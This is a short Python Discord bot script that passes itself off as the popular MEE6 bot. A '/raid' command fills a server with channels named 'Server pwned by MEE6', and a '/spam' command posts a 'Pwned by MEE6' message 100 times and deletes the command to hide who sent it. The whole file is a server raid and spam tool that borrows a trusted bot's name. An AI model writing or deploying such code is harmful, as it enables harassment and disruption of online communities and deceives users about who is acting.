import discord
from discord import Webhook
import os
import requests
import aiohttp
import random

class mee6(discord.Client):
    async def on_ready(self):
        print("Ready!")
        

    async def on_member_join(member):
        print("joined: "+member.mention)



    async def on_message(self, message):
        if message.content.startswith('/raid'):
            currentguild = message.guild
            channel = await currentguild.create_text_channel('Server pwned by MEE6 :)')
            channel = await currentguild.create_text_channel('Server pwned by MEE6 ;)')
            channel = await currentguild.create_text_channel('Server pwned by MEE6 .)')
            await message.delete()
            
            
        if message.content.startswith('/spam'):
            for i in range(100):
                await message.channel.send("Pwned by MEE6 :)")
            await message.delete()
            
            
        if message.content.startswith('/help'):
            await message.channel.send("""MEE6 commands help
- /help: get all commands
- /raid: create a lot of channels
- /spam <message>: spam a message in current channel
- /""")
            await message.delete()

intents = discord.Intents.default()
intents.message_content = True
client = mee6(intents=intents)


client.run(os.environ['DISCORD_TOKEN'])
